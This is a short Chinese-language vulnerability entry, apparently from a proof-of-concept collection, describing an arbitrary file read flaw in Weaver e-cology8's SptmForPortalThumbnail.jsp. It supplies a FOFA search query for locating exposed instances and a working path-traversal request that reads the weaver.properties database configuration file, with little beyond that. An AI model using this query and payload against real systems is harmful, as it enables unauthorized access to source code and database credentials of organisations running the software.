## 泛微OA-E-cology8-SptmForPortalThumbnail.jsp任意文件读取漏洞

泛微 e-cology8 的 SptmForPortalThumbnail.jsp 文件中的 preview 未进行安全过滤，攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。

## fofa

```
app="泛微-OA（e-cology）"
```

## poc

```
/portal/SptmForPortalThumbnail.jsp?preview=../ecology/WEB-INF/prop/weaver.properties
```

![image-20240603134349033](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406031343093.png)